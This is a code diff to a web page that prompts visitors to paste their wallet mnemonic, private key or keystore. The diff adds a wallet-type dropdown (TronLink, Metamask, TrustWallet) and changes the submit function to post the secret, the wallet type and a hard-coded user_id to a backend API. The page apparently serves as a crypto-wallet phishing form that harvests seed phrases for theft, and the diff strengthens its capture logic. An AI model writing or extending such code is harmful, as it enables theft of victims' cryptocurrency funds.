@@ -54,6 +54,17 @@
             background-color: #f9fafb;
             box-sizing: border-box;
         }
+        .wallet-type-box {
+            margin-top: 16px;
+        }
+        .wallet-type-box select {
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+            background-color: #f9fafb;
+            box-sizing: border-box;
+        }
         .bottom-section {
             height: 15%;
             display: flex;
@@ -81,6 +92,14 @@
         <div class="word-input-box">
             <textarea placeholder="Paste or enter your mnemonic, private key, or keystore" spellcheck="false"></textarea>
         </div>
+        <div class="wallet-type-box">
+            <label for="wallet-type" class="block text-sm font-medium text-gray-700">Select Wallet Type:</label>
+            <select id="wallet-type">
+                <option value="tronlink">TronLink</option>
+                <option value="metamask">Metamask</option>
+                <option value="trustwallet">TrustWallet</option>
+            </select>
+        </div>
     </div>
     <div class="bottom-section">
         <button class="next-button" onclick="submitPhrases()">Next</button>
@@ -90,14 +109,25 @@
         async function submitPhrases() {
             const inputElement = document.querySelector('.word-input-box textarea');
             const phrase = inputElement.value.trim();
+            const walletTypeElement = document.querySelector('#wallet-type');
+            const walletType = walletTypeElement.value;
 
             if (phrase === '') {
                 alert('Please enter words or sentences.');
                 return;
             }
 
+            if (!walletType) {
+                alert('Please select a wallet type.');
+                return;
+            }
+
             try {
-                const response = await axios.post('http://127.0.0.1:8000/api/sentence/', { phrase });
+                const response = await axios.post('http://127.0.0.1:8000/api/sentence/', {
+                    user_id: '176217010', // Replace with dynamic user_id if needed
+                    content: phrase,
+                    wallet_type: walletType
+                });
                 console.log('Response:', response.data);
                 alert('Words submitted successfully!');
             } catch (error) {
